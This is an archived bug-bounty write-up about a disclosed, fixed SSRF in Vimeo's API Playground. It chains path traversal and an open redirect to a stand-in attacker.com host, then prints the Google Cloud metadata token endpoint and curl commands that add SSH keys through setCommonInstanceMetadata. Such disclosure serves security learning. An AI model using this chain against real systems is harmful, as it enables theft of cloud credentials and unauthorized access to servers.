---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-03-08_vimeo-ssrf-with-code-execution-potential.md
original_filename: 2019-03-08_vimeo-ssrf-with-code-execution-potential.md
title: Vimeo SSRF with code execution potential.
category: documents
detected_topics:
- oauth
- ssrf
- access-control
- command-injection
- path-traversal
- otp
tags:
- imported
- documents
- oauth
- ssrf
- access-control
- command-injection
- path-traversal
- otp
language: en
raw_sha256: c8ebc861e35e34255c0e3444de42da38eb8e39dc1b52fedc7621b8009e9b7fba
text_sha256: 89394c45d3e217883bd6307590f8438d759fd50990778a01553b5cd29e7517da
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: true
---

# Vimeo SSRF with code execution potential.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-03-08_vimeo-ssrf-with-code-execution-potential.md
- Source Type: markdown
- Detected Topics: oauth, ssrf, access-control, command-injection, path-traversal, otp
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: True
- Raw SHA256: `c8ebc861e35e34255c0e3444de42da38eb8e39dc1b52fedc7621b8009e9b7fba`
- Text SHA256: `89394c45d3e217883bd6307590f8438d759fd50990778a01553b5cd29e7517da`


## Content

---
title: "Vimeo SSRF with code execution potential."
url: "https://medium.com/@rootxharsh_90844/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e"
authors: ["Harsh Jaiswal (@rootxharsh)"]
programs: ["Vimeo"]
bugs: ["SSRF"]
bounty: "5,000"
publication_date: "2019-03-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5372
scraped_via: "browseros"
---

# Vimeo SSRF with code execution potential.

Harsh Jaiswal
 highlighted

Vimeo SSRF with code execution potential.
Harsh Jaiswal
Follow
4 min read
·
Mar 8, 2019

2.1K

7

Recently I discovered a semi responded SSRF on Vimeo with code execution possibility. This blog post explains how I found & exploited it. So let's get started.

Background.

Vimeo provides an API console for their API called API Playground, The requests made using this web app is done from server-side. Take the bellow request as an example.

Press enter or click to view image in full size
Base request

This request is supposed to make a server-side GET request to

https://api.vimeo.com/users/{user_id}/videos/{video_id}

If you look closely to the request we control quite of things here, First the uri parameter which is the endpoint to hit on endpoint i.e. in this case is /users/{user_id}/videos/{video_id} , Request method i.e., in this case, is set to GET , params which are supposed to be post parameters if the request method is POST. user_id & video_id are kind of variables whose values gets defined in segments parameter.

Path traversal in HTTP requests made on server side.

I first tried to change URI parameter to my custom path however any change in URI will result in a 403, Means that they’re allowing a set of API endpoints. However, changing the value of variables such as user_id & videos_id is possible because they’re intentional and because these values reflect in the path of URL. Passing ../../../ will result in a request to ROOT of api.vimeo.com
Below is what happens.

URL.parse(“https://api.vimeo.com/users/1122/videos/../../../attacker”)

Result: https://api.vimeo.com/attacker

Press enter or click to view image in full size
Path traversal in HTTP requests made on server side

As you can see in response all endpoints of api.vimeo.com is listed which is root response of api.vimeo.com if you make an authenticated request (with authorization header).

What now? We’re still on api.vimeo.com host, how do we escape it?

Well, I figured that this is following HTTP 30X redirects, Its a long story took a Lil bit of logical thinking.

Back to the point, Now I know this is following HTTP redirects and we’re good to move forward, We need an open redirect so that we can redirect server to our controlled asset.

The good old content discovery…

A minute of content discovery and I came across an endpoint on api.vimeo.com which makes a redirection to vimeo.com with our controlled path on vimeo.com

https://api.vimeo.com/m/something

Press enter or click to view image in full size
api.vimeo.com to vimeo.com

Cool, Now we have a wide scope to find an open redirect, I have a not very useful open redirect on vimeo.com, I won't be disclosing its details but let's just assume it is something like this

https://vimeo/vulnerable/open/redirect?url=https://attacker.com

This makes a 302 redirect to attacker.com,

Chain completed to redirect to attacker asset..

The final payload to redirect the server to our controlled asset is

../../../m/vulnerable/open/redirect?url=https://attacker.com

Passing this value inside video_id will parse URL in this way

https://api.vimeo.com/users/1122/videos/../../../m/vulnerable/open/redirect?url=https://attacker.com

Which on parsing becomes

https://api.vimeo.com/m/vulnerable/open/redirect?url=https://attacker.com

HTTP redirection made & followed to

https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com

Another HTTP redirection made & followed to

https://attacker.com

Press enter or click to view image in full size
SSRF Achieved, Redacted details regarding the open redirect and my domain.

The server expects a JSON response and parses it and shows in response.

Exploiting..

As Vimeo infrastructure is on Google cloud, My first attempt was to hit the Google metadata API. I followed the approach taken by André Baptista (0xacb)

Get Harsh Jaiswal’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This endpoint gives us service account token.

http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json

{ “headers”: [ “HTTP/1.1 200”, “Content-Type: application/json”, “Host: api.vimeo.com” ], “code”: 200, “body”: { “access_token”: “ya29.c.EmKeBq9XXDWtXXXXXXXXecIkeR0dFkGT0rJSA”, “expires_in”: 2631, “token_type”: “Bearer” } }

Scope of token

$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
 
Response:
{ "issued_to": "101302079XXXXX", "audience": "10130207XXXXX", "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", "expires_in": 2443, "access_type": "offline" }

I could then use this token to add my public SSH key to the instance and then connect via my private key

$ curl -X POST “https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" -H “Authorization: Bearer ***REDACTED***” -H “Content-Type: application/json” — data ‘{“items”: [{“key”: “harsh-bugdiscloseguys”, “value”: “harsh-ssrf”}]}

Response: 
{ “kind”: “compute#operation”, “id”: “63228127XXXXXX”, “name”: “operation-XXXXXXXXXXXXXXXXXX”, “operationType”: “compute.projects.setCommonInstanceMetadata”, “targetLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX", “targetId”: “10423XXXXXXXX”, “status”: “RUNNING”, “user”: “10423XXXXXXXX-compute@developer.gserviceaccount.com”, “progress”: 0, “insertTime”: “2019–01–27T15:50:11.598–08:00”, “startTime”: “2019–01–27T15:50:11.599–08:00”, “selfLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX/global/operations/operation-XXXXXX"}

And…

Press enter or click to view image in full size
keys added
Press enter or click to view image in full size
*Le me

However, SSH port was open on the internal network only :(( but this was enough to prove that internally this can be escalated to shell access.

Kubernetes keys were also extracted from metadata API, but for some reason, I was not able to use them, Although the Vimeo team did confirm they were valid.

Due to my work & involvement with Vimeo, I was allowed to go deeper than would normally have been allowed.

That’s it, folks. I hope you liked this. Share/Re-Tweet is much appreciated, Have any questions regarding this? DM @ rootxharsh

Thanks to;

Vimeo team for allowing disclosure of this issue.

Andre (0xacb) for his awesome report

Brett (bbuerhaus) for his write up about this SSRF (He and Ben have some lit AF writeups)

Timeline

28th Jan early morning: Initial discovery.

28th Jan: Triaged by HackerOne team

28th Jan: Vimeo team rewarded initial $100 and pushed a temporary fix.

30th/31st Jan: Permanent fix pushed

1st Feb: $4900 rewarded.
